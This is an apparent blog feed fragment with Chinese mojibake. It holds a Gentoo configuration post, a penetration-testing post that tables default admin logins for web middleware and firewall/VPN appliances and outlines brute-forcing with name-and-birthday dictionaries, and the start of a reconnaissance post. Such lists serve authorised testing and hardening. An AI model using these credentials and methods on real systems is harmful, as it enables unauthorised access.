title="3 USE"></a>3 USE</h1><h2 id="3-1-make-conf"><a href="#3-1-make-conf" class="headerlink" title="3.1 make.conf"></a>3.1 make.conf</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># These settings were set by the catalyst build script that automatically</span><br><span class="hljs-comment"># built this stage.</span><br><span class="hljs-comment"># Please consult /usr/share/portage/config/make.conf.example for a more</span><br><span class="hljs-comment"># detailed example.</span><br>COMMON_FLAGS=<span class="hljs-string">&quot;-march=native -O2 -pipe&quot;</span><br>CFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>CXXFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FCFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>MAKEOPTS=<span class="hljs-string">&quot;-j25&quot;</span><br><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> This stage was built with the bindist Use flag enabled</span><br>PORTDIR=<span class="hljs-string">&quot;/var/db/repos/gentoo&quot;</span><br>DISTDIR=<span class="hljs-string">&quot;/var/cache/distfiles&quot;</span><br>PKGDIR=<span class="hljs-string">&quot;/var/cache/binpkgs&quot;</span><br><br><span class="hljs-comment"># This sets the language of build output to English.</span><br><span class="hljs-comment"># Please keep this setting intact when reporting bugs.</span><br>LC_MESSAGES=C<br><br><span class="hljs-comment"># mirrors</span><br>GENTOO_MIRRORS=<span class="hljs-string">&quot;https://mirrors.ustc.edu.cn/gentoo/&quot;</span><br>ACCEPT_LICENSE=<span class="hljs-string">&quot;*&quot;</span><br>ACCEPT_KEYWORDS=<span class="hljs-string">&quot;amd64&quot;</span><br>AUTO_CLEAN=<span class="hljs-string">&quot;yes&quot;</span><br><br><span class="hljs-comment"># aria</span><br>FETCHCOMMAND=<span class="hljs-string">&quot;/usr/bin/aria2c -d \$&#123;DISTDIR&#125; -o \$&#123;FILE&#125; --allow-overwrite=true --max-tries=5 --max-file-not-found=2 --max-concurrent-downloads=5 --connect-timeout=5 --timeout=5 --split=5 --min-split-size=2M --lowest-speed-limit=20K --max-connection-per-server=9 --uri-selector=feedback \$&#123;URI&#125;&quot;</span><br>RESUMECOMMAND=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FETCHCOMMAND&#125;</span>&quot;</span><br><br><span class="hljs-comment"># ccache</span><br>FEATURES=<span class="hljs-string">&quot;ccache -test&quot;</span><br>CCACHE_DIR=<span class="hljs-string">&quot;/var/cache/ccache&quot;</span><br><br><span class="hljs-comment"># GRUB</span><br>GRUB_PLATFORMS=<span class="hljs-string">&quot;efi-64&quot;</span><br><br><span class="hljs-comment"># CPUS</span><br>ABI_X86=<span class="hljs-string">&quot;64&quot;</span><br>CPU_FLAGS_X86=<span class="hljs-string">&quot;aes avx avx2 f16c fma3 mmx mmxext pclmul popcnt rdrand sha sse sse2 sse3 sse4_1 sse4_2 sse4a ssse3&quot;</span><br><br><span class="hljs-comment"># cards</span><br>VIDEO_CARDS=<span class="hljs-string">&quot;amdgpu radeonsi vmware&quot;</span><br><br><span class="hljs-comment"># touchpad</span><br><span class="hljs-comment">#INPUT_DEVICES=&quot;libinput synaptics&quot;  ##è®¾ç½®åè§¦æ‘¸æ¿é…ç½®å¤±æ•ˆ</span><br><br><span class="hljs-comment"># language</span><br>L10N=<span class="hljs-string">&quot;en-US zh-CN en zh&quot;</span><br>LINGUAS=<span class="hljs-string">&quot;en-US zh-CN en zh&quot;</span><br><br><span class="hljs-comment"># USE</span><br><br>SYSME=<span class="hljs-string">&quot;-test -doc systemd&quot;</span><br>GNOME=<span class="hljs-string">&quot;-kde -games -help -extras X gtk gnome&quot;</span><br>USE=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;SYSME&#125;</span> <span class="hljs-variable">$&#123;GNOME&#125;</span> &quot;</span><br></code></pre></td></tr></table></figure><h2 id="3-2-USE"><a href="#3-2-USE" class="headerlink" title="3.2 USE"></a>3.2 USE</h2><p>ä¸ªäºº <code>USE</code> ä½¿ç”¨è¯´æ˜ï¼š</p><ul><li><code>/etc/portage/make.conf</code> ä»…æ·»åŠ å¿…è¦ <code>flag</code> ä¸”å°½é‡ä»…æ·»åŠ æ’é™¤é¡¹ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">SYSME=<span class="hljs-string">&quot;-test -doc systemd&quot;</span><br>GNOME=<span class="hljs-string">&quot;-kde -games -help -extras X gtk gnome&quot;</span><br>USE=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;SYSME&#125;</span> <span class="hljs-variable">$&#123;GNOME&#125;</span> &quot;</span><br></code></pre></td></tr></table></figure></li><li><code>/etc/portage/package.accept_keywords</code> æ–‡ä»¶å¤¹ä¸­åˆ›å»ºæ–‡ä»¶ï¼Œæ·»åŠ éœ€è¦å¼€å¯ <code>~amd</code>(æµ‹è¯•) å±æ€§çš„åŒ…<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-office/wps-office ~*<br></code></pre></td></tr></table></figure></li><li><code>/etc/portage/package.use</code> æ–‡ä»¶å¤¹ä¸­åˆ›å»ºæ–‡ä»¶ï¼Œæ·»åŠ ä¸ <code>/etc/portage/make.conf</code> ä¸­ <code>USE</code> ç›¸æ‚–æˆ–è€…ä»…å¯¹è¯¥åŒ…ç”Ÿæ•ˆçš„ <code>flag</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-emulation/qemu spice QEMU_SOFTMMU_TARGETS: x86_64 QEMU_USER_TARGETS: x86_64<br>net-dns/dnsmasq script<br>net-misc/spice-gtk usbredir<br></code></pre></td></tr></table></figure></li></ul><h1 id="4-tools"><a href="#4-tools" class="headerlink" title="4 tools"></a>4 tools</h1><h2 id="4-1-åŒ…ç®¡ç†"><a href="#4-1-åŒ…ç®¡ç†" class="headerlink" title="4.1 åŒ…ç®¡ç†"></a>4.1 åŒ…ç®¡ç†</h2><h3 id="4-1-1-app-portage-x2F-eix"><a href="#4-1-1-app-portage-x2F-eix" class="headerlink" title="4.1.1 app-portage&#x2F;eix"></a>4.1.1 app-portage&#x2F;eix</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-portage/eix<br>app-portage/gentoolkit<br>app-portage/layman<br></code></pre></td></tr></table></figure><h2 id="4-2-æ–‡ä»¶ç³»ç»Ÿ"><a href="#4-2-æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="4.2 æ–‡ä»¶ç³»ç»Ÿ"></a>4.2 æ–‡ä»¶ç³»ç»Ÿ</h2><h3 id="4-2-1-sys-fs-x2F-lvm2"><a href="#4-2-1-sys-fs-x2F-lvm2" class="headerlink" title="4.2.1 sys-fs&#x2F;lvm2"></a>4.2.1 sys-fs&#x2F;lvm2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sys-fs/lvm2<br></code></pre></td></tr></table></figure><h3 id="4-2-2-ntfs"><a href="#4-2-2-ntfs" class="headerlink" title="4.2.2 ntfs"></a>4.2.2 ntfs</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sys-fs/ntfs3g<br></code></pre></td></tr></table></figure><h2 id="4-3-DE"><a href="#4-3-DE" class="headerlink" title="4.3 DE"></a>4.3 DE</h2><h3 id="4-3-1-gnome"><a href="#4-3-1-gnome" class="headerlink" title="4.3.1 gnome"></a>4.3.1 gnome</h3><blockquote><p>ä¸€å®šè¦æœ‰swapåˆ†åŒºï¼Œå¦åˆ™ç¼–è¯‘ä¸ä¼šé€šè¿‡<br>make.conf ä¸­ MAKEOPTS&#x3D;â€-j4â€ æ­¤æ¡ä¸å­˜åœ¨ç¼–è¯‘ä¹Ÿä¼šå¤±è´¥</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gnome-base/gnome<br>gnome-base/gconf<br>gnome-extra/gnome-tweaks<br></code></pre></td></tr></table></figure><h2 id="4-4-vitual"><a href="#4-4-vitual" class="headerlink" title="4.4 vitual"></a>4.4 vitual</h2><h3 id="4-4-1-virtualbox"><a href="#4-4-1-virtualbox" class="headerlink" title="4.4.1 virtualbox"></a>4.4.1 virtualbox</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-emulation/virtualbox<br>app-emulation/virtualbox-additions<br>app-emulation/virtualbox-extpack-oracle<br>app-emulation/virtualbox-modules<br>app-emulation/virtualbox-guest-additions  <span class="hljs-comment"># gentooè™šæ‹Ÿæœºå®‰è£…</span><br></code></pre></td></tr></table></figure><h3 id="4-4-2-kvm"><a href="#4-4-2-kvm" class="headerlink" title="4.4.2 kvm"></a>4.4.2 kvm</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-emulation/qemu<br>app-emulation/libvirt<br>app-emulation/virt-manager<br>net-misc/bridge-utils<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">usermod -a -G libvirt miloo<br>usermod -a -G kvm miloo <br>systemctl <span class="hljs-built_in">enable</span> libvirtd<br>systemctl <span class="hljs-built_in">enable</span> virtlogd-admin.socket<br></code></pre></td></tr></table></figure><h1 id="5-ç³»ç»Ÿè¿ç§»"><a href="#5-ç³»ç»Ÿè¿ç§»" class="headerlink" title="5 ç³»ç»Ÿè¿ç§»"></a>5 ç³»ç»Ÿè¿ç§»</h1><h2 id="5-1-æƒé™å¤‡ä»½ä¸æ¢å¤"><a href="#5-1-æƒé™å¤‡ä»½ä¸æ¢å¤" class="headerlink" title="5.1 æƒé™å¤‡ä»½ä¸æ¢å¤"></a>5.1 æƒé™å¤‡ä»½ä¸æ¢å¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">getfacl -R ./ &gt; acl.txt<br>setfacl --restore=acl.txt<br></code></pre></td></tr></table></figure><h2 id="5-2-ç”¨æˆ·ç»„"><a href="#5-2-ç”¨æˆ·ç»„" class="headerlink" title="5.2 ç”¨æˆ·ç»„"></a>5.2 ç”¨æˆ·ç»„</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ç”¨æˆ·id=<span class="hljs-number">1001</span><span class="hljs-comment">(miloo)</span> ç»„id=<span class="hljs-number">100</span><span class="hljs-comment">(users)</span> ç»„=<span class="hljs-number">100</span><span class="hljs-comment">(users)</span>,<span class="hljs-number">10</span><span class="hljs-comment">(wheel)</span>,<span class="hljs-number">11</span><span class="hljs-comment">(floppy)</span>,<span class="hljs-number">18</span><span class="hljs-comment">(audio)</span>,<span class="hljs-number">19</span><span class="hljs-comment">(cdrom)</span>,<span class="hljs-number">27</span><span class="hljs-comment">(video)</span>,<span class="hljs-number">85</span><span class="hljs-comment">(usb)</span>,<span class="hljs-number">78</span><span class="hljs-comment">(kvm)</span>,<span class="hljs-number">272</span><span class="hljs-comment">(plugdev)</span>,<span class="hljs-number">172</span><span class="hljs-comment">(pulse-access)</span>,<span class="hljs-number">304</span><span class="hljs-comment">(vboxusers)</span>,<span class="hljs-number">79</span><span class="hljs-comment">(libvirt)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>Gentoo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Gentoo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç»å…¸æ¼æ´-å¼±å£ä»¤</title>
    <link href="/2022/06/17/2022-06-17.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    <url>/2022/06/17/2022-06-17.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4">1 é»˜è®¤å¼±å£ä»¤</a><ul><li><a href="#11-web%E5%AE%B9%E5%99%A8%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4">1.1 webå®¹å™¨åå°å¼±å£ä»¤</a></li><li><a href="#12-%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%BC%B1%E5%8F%A3%E4%BB%A4">1.2 å®‰å…¨è®¾å¤‡å¼±å£ä»¤</a></li></ul></li><li><a href="#2-%E5%AE%9E%E6%88%98%E6%80%9D%E8%B7%AF">2 å®æˆ˜æ€è·¯</a><ul><li><a href="#21-%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90">2.1 å­—å…¸ç”Ÿæˆ</a></li><li><a href="#22-%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7">2.2 æ‰¹é‡çˆ†ç ´å·¥å…·</a></li></ul></li></ul><h1 id="1-é»˜è®¤å¼±å£ä»¤"><a href="#1-é»˜è®¤å¼±å£ä»¤" class="headerlink" title="1 é»˜è®¤å¼±å£ä»¤"></a>1 é»˜è®¤å¼±å£ä»¤</h1><h2 id="1-1-webå®¹å™¨åå°å¼±å£ä»¤"><a href="#1-1-webå®¹å™¨åå°å¼±å£ä»¤" class="headerlink" title="1.1 webå®¹å™¨åå°å¼±å£ä»¤"></a>1.1 webå®¹å™¨åå°å¼±å£ä»¤</h2><table><thead><tr><th>å¸¸è§ä¸­é—´ä»¶</th><th>ç®¡ç†ç«¯å£</th><th>åå°åœ°å€</th><th>é»˜è®¤è´¦å·åå¯†ç </th></tr></thead><tbody><tr><td>Jboss</td><td>8080</td><td><a href="http://ip:8080/web-console/">http://ip:8080/web-console/</a></br><a href="http://ip:8080/jmx-console/">http://ip:8080/jmx-console/</a></br><a href="http://ip:8080/console">http://ip:8080/console</a></td><td>admin&#x2F;admin</td></tr><tr><td>WebSphere</td><td>9060(æ§åˆ¶å°ç«¯å£)</br>9043</br>9080</br>9443</br>2809</br>5060</br>5061</br>8880</br>9401</br>9403</br>9402</br>9100</br>9353</br>7276</br>7286</br>5558</br>5578</td><td><a href="http://ip:9060/ibm/console/">http://ip:9060/ibm/console/</a></td><td>é»˜è®¤æ²¡æœ‰é‰´æƒé¡µé¢</td></tr><tr><td>Weblogic</td><td>7001(httpç®¡ç†æ§åˆ¶ç«¯å£)</br>7002(httpsç®¡ç†æ§åˆ¶ç«¯å£)</td><td><a href="http://ip:7001/console">http://ip:7001/console</a></td><td>weblogic&#x2F;weblogic1</br>weblogic&#x2F;weblogic</br>system&#x2F;system</br>portaladmin&#x2F;portaladmin</br>guest&#x2F;guest</td></tr><tr><td>Tomcat</td><td>8080</td><td><a href="http://ip:8080/manager/html">http://ip:8080/manager/html</a></td><td>tomcat&#x2F;tomcat</br>both&#x2F;tomcat</br>role1&#x2F;tomcat</br>manager&#x2F;admin</td></tr></tbody></table><h2 id="1-2-å®‰å…¨è®¾å¤‡å¼±å£ä»¤"><a href="#1-2-å®‰å…¨è®¾å¤‡å¼±å£ä»¤" class="headerlink" title="1.2 å®‰å…¨è®¾å¤‡å¼±å£ä»¤"></a>1.2 å®‰å…¨è®¾å¤‡å¼±å£ä»¤</h2><table><thead><tr><th>äº§å“</th><th>ç™»å½•åœ°å€</th><th>é»˜è®¤è´¦å·åå¯†ç </th><th>æŠ€æœ¯æ”¯æŒçƒ­çº¿</th></tr></thead><tbody><tr><td>å¤©èä¿¡é˜²ç«å¢™</td><td><a href="https://192.168.1.254/">https://192.168.1.254</a></br><a href="https://192.168.1.254:8080/">https://192.168.1.254:8080</a></td><td>superman&#x2F;talent</br>superman&#x2F;talent!23</td><td>8008105119</td></tr><tr><td>è”æƒ³ç½‘å¾¡é˜²ç«å¢™(éœ€è¦è¯ä¹¦)</td><td><a href="https://10.1.5.254:8889/">https://10.1.5.254:8889</a></td><td>admin&#x2F;leadsec@7766</br>admin&#x2F;administrator</br>admin&#x2F;bane@7766</td><td>4008107766</br>1056632666</td></tr><tr><td>æ·±ä¿¡æœé˜²ç«å¢™</td><td><a href="https://10.251.251.251/">https://10.251.251.251</a></br><a href="https://10.254.254.254/">https://10.254.254.254</a></td><td>admin&#x2F;admin</td><td>4006306430</td></tr><tr><td>å¯æ˜æ˜Ÿè¾°</td><td><a href="https://10.1.5.254:8889/">https://10.1.5.254:8889</a></br><a href="https://10.50.10.45:8889/">https://10.50.10.45:8889</a></td><td>admin&#x2F;baneï¼ 7766</br>admin&#x2F;adminï¼ 123</td><td>10.50.10.44&#x2F;255.255.255.0</br>æŠ€æœ¯æ”¯æŒçƒ­çº¿:4006243900</td></tr><tr><td>juniper</td><td><a href="https://192.168.1.1/">https://192.168.1.1</a></td><td>netscreen&#x2F;netscreen</td><td></td></tr><tr><td>Cisco</td><td><a href="https://192.168.0.1/">https://192.168.0.1</a></td><td>admin&#x2F;cisco</td><td></td></tr><tr><td>Huawei</td><td><a href="http://192.168.0.1/">http://192.168.0.1</a></td><td>admin&#x2F;Adminï¼ 123</td><td></td></tr><tr><td>H3C</td><td><a href="http://192.168.0.1/">http://192.168.0.1</a></td><td>admin&#x2F;admin</td><td>4006306430</td></tr><tr><td>ç»¿ç›ŸIPS</td><td><a href="https://192.168.1.101/">https://192.168.1.101</a></td><td>weboper&#x2F;weboper</td><td>é…ç½®é‡å¯ç”Ÿæ•ˆ</td></tr><tr><td>ç½‘ç¥é˜²ç«å¢™GE1å£</td><td><a href="https://10.50.10.45/">https://10.50.10.45</a></td><td>admin&#x2F;firewall</td><td>4006108220</td></tr><tr><td>æ·±ä¿¡æœVPN</td><td>51111ç«¯å£</td><td>delanrecover</td><td></td></tr><tr><td>åä¸ºVPN</td><td></td><td>root&#x2F;mduadmin</td><td></td></tr><tr><td>åä¸ºé˜²ç«å¢™</td><td></td><td>admin&#x2F;Adminï¼ 123</br>eudemon&#x2F;eudemon</td><td></td></tr><tr><td>Juniperé˜²ç«å¢™</td><td></td><td>netscreen&#x2F;netscreen</td><td></td></tr><tr><td>è¿ªæ™®</td><td>192.168.0.1</td><td>adminï¼adminï¼¿default</td><td></td></tr><tr><td>å±±çŸ³</td><td>192.168.1.1</td><td>hillstone&#x2F;hillstone</td><td></td></tr><tr><td>å®‰æ’çš„æ˜å¾¡é˜²ç«å¢™</td><td></td><td>adminï¼adminadmin</td><td></td></tr><tr><td>æŸå ¡å’æœº</td><td></td><td>shtermï¼shterm</td><td></td></tr><tr><td>å¤©èä¿¡çš„vpn</td><td></td><td>testï¼123456</td><td></td></tr></tbody></table><h1 id="2-å®æˆ˜æ€è·¯"><a href="#2-å®æˆ˜æ€è·¯" class="headerlink" title="2 å®æˆ˜æ€è·¯"></a>2 å®æˆ˜æ€è·¯</h1><ul><li>æˆæƒé¡¹ç›®</li></ul><ol><li>ipåœ°å€</li><li>è¸©ç‚¹è·å¾—äººå‘˜å§“ååŠç”Ÿæ—¥</li></ol><h2 id="2-1-å­—å…¸ç”Ÿæˆ"><a href="#2-1-å­—å…¸ç”Ÿæˆ" class="headerlink" title="2.1 å­—å…¸ç”Ÿæˆ"></a>2.1 å­—å…¸ç”Ÿæˆ</h2><ul><li>äººå‘˜å§“åå¤§å°å†™åŠ ç”Ÿæ—¥çš„å¼±å£ä»¤</li><li>å¸¸è§„å¼±å£ä»¤</li></ul><h2 id="2-2-æ‰¹é‡çˆ†ç ´å·¥å…·"><a href="#2-2-æ‰¹é‡çˆ†ç ´å·¥å…·" class="headerlink" title="2.2 æ‰¹é‡çˆ†ç ´å·¥å…·"></a>2.2 æ‰¹é‡çˆ†ç ´å·¥å…·</h2><ul><li>SNETCracker</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>PenTest</category>
      
      <category>ç»å…¸æ¼æ´</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>PenTest</tag>
      
      <tag>ç»å…¸æ¼æ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¿¡æ¯æ”¶é›†</title>
    <link href="/2022/05/30/2022-05-30.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/05/30/2022-05-30.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-ip%E6%94%B6%E9%9B%86">1 IPæ”¶é›†</a><ul><li><a href="#11-%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8cdn">1.1 åˆ¤æ–­ç›®æ ‡æœ‰æ²¡æœ‰ä½¿ç”¨CDN</a></li><li><a href="#12-%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9Eip">1.2 æŸ¥æ‰¾çœŸå®IP</a><ul><li><a href="#121-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BD%91%E7%BB%9C%E6%90%9C%E7%B4%A2%E5%B9%B3%E5%8F%B0">1.2.1 å¤§æ•°æ®ç½‘ç»œæœç´¢å¹³å°</a></li><li><a href="#122-%E5%8E%86%E5%8F%B2dns%E8%AE%B0%E5%BD%95">1.2.2 å†å²DNSè®°å½•</a></li><li><a href="#123-%E4%B8%BB%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%9A%B4%E9%9C%B2%E7%9A%84%E7%9C%9F%E5%AE%9Eip">1.2.3 ä¸»åŠ¨è¿æ¥æš´éœ²çš„çœŸå®ip</a></li><li><a href="#124-%E5%9B%BD%E5%A4%96%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE">1.2.4 å›½å¤–ä»£ç†è®¿é—®</a></li><li><a href="#125-%E7%BA%AF%E7%9C%9Fip%E6%95%B0%E6%8D%AE%E5%BA%93">1.2.5 çº¯çœŸipæ•°æ®åº“</a></li></ul></li><li><a href="#13-ip%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">1.3 IPä¿¡æ¯æ”¶é›†</a><ul><li><a href="#131-ip-%E6%AE%B5%E6%95%B4%E7%90%86">1.3.1 IP æ®µæ•´ç†</a></li><li><a href="#132-c%E6%AE%B5%E6%97%81%E7%AB%99">1.3.2 Cæ®µã€æ—ç«™</a></li></ul></li><li><a href="#14-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">1.4 æœç´¢å¼•æ“</a></li></ul></li><li><a href="#2-%E5%9F%9F%E5%90%8D%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86">2 åŸŸåã€å­åŸŸåæ”¶é›†</a><ul><li><a href="#21-%E5%9F%9F%E5%90%8D%E7%9A%84%E5%A4%87%E6%A1%88%E5%8F%B7">2.1 åŸŸåçš„å¤‡æ¡ˆå·</a></li><li><a href="#22-%E5%AD%90%E5%9F%9F%E5%90%8D%E5%B7%A5%E5%85%B7">2.2 å­åŸŸåå·¥å…·</a></li><li><a href="#23-%E5%9C%A8%E7%BA%BF%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E5%8F%A3">2.3 åœ¨çº¿å­åŸŸåæ¥å£</a></li><li><a href="#24-%E5%85%B6%E4%BB%96%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF">2.4 å…¶ä»–æ³„éœ²ä¿¡æ¯</a></li><li><a href="#25-ssl%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2">2.5 SSLè¯ä¹¦æŸ¥è¯¢</a></li></ul></li><li><a href="#3-app%E6%94%B6%E9%9B%86">3 APPæ”¶é›†</a><ul><li><a href="#31-app%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC">3.1 appä¿¡æ¯æ”¶é›†å’Œå†å²ç‰ˆæœ¬</a></li><li><a href="#32-%E5%B7%A5%E5%85%B7">3.2 å·¥å…·</a></li></ul></li><li><a href="#4-mail%E6%94%B6%E9%9B%86">4 MAILæ”¶é›†</a></li><li><a href="#5-web%E6%94%B6%E9%9B%86">5 WEBæ”¶é›†</a></li><li><a href="#6-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB">6 æŒ‡çº¹è¯†åˆ«</a><ul><li><a href="#61-%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BD%91%E7%AB%99">6.1 ç¬¬ä¸‰æ–¹ç½‘ç«™</a></li><li><a href="#62-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6">6.2 æµè§ˆå™¨æ’ä»¶</a></li><li><a href="#63-%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7">6.3 å…¶ä»–å·¥å…·</a></li></ul></li><li><a href="#7-%E7%AB%AF%E5%8F%A3%E8%AF%86%E5%88%AB">7 ç«¯å£è¯†åˆ«</a><ul><li><a href="#71-%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3">7.1 å¸¸è§ç«¯å£</a></li><li><a href="#72-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">7.2 æ‰«æå·¥å…·</a></li></ul></li><li><a href="#8-%E5%8F%A3%E4%BB%A4%E6%94%B6%E9%9B%86">8 å£ä»¤æ”¶é›†</a><ul><li><a href="#81-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AD%97%E5%85%B8%E7%9A%84%E7%94%9F%E6%88%90">8.1 å¼±å£ä»¤å­—å…¸çš„ç”Ÿæˆ</a></li></ul></li></ul><h1 id="1-IPæ”¶é›†"><a href="#1-IPæ”¶é›†" class="headerlink" title="1 IPæ”¶é›†"></a>1 IPæ”¶é›†</h1><h2 id="1-1-åˆ¤æ–­ç›®æ ‡æœ‰æ²¡æœ‰ä½¿ç”¨CDN"><a href="#1-1-åˆ¤æ–­ç›®æ ‡æœ‰æ²¡æœ‰ä½¿ç”¨CDN" class="headerlink" title="1.1 åˆ¤æ–­ç›®æ ‡æœ‰æ²¡æœ‰ä½¿ç”¨CDN"></a>1.1 åˆ¤æ–­ç›®æ ‡æœ‰æ²¡æœ‰ä½¿ç”¨CDN</h2><p><a href="https://ping.chinaz.com/">å…¨çƒping</a></p><p>ä»¥ baidu.com ä¸ºä¾‹ï¼Œå…¨çƒpingç»“æœæ˜¾ç¤ºå¦‚ä¸‹ï¼Œå…¶ä¸­ipå½’å±åœ°çš†ä¸ºä¸­å›½åŒ—äº¬æµ·æ·€ ç”µä¿¡ï¼Œä½†æ˜¯ipåœ°å€ä¸åŒï¼Œåˆ™å¯ä»¥ç¡®å®šä¸ºä½¿ç”¨äº†CDNï¼Œå¦‚æœç»“æœæ˜¾ç¤ºipå½’å±åœ°åœ¨ä¸åŒåœ°å€ï¼Œä¹Ÿå¯ä»¥ç¡®å®šä¸ºä½¿ç”¨äº†CDNï¼š</p><table><thead><tr><th>ç›‘æµ‹ç‚¹</th><th>å“åº”IP</th><th>IPå½’å±åœ°</th><th>å“åº”æ—¶é—´</th><th>TTL</th><th>èµåŠ©å•†</th></tr></thead><tbody><tr><td>å››å·ç»µé˜³[ç”µä¿¡]</td><td>220.181.38.251</td><td>ä¸­å›½åŒ—äº¬æµ·æ·€ 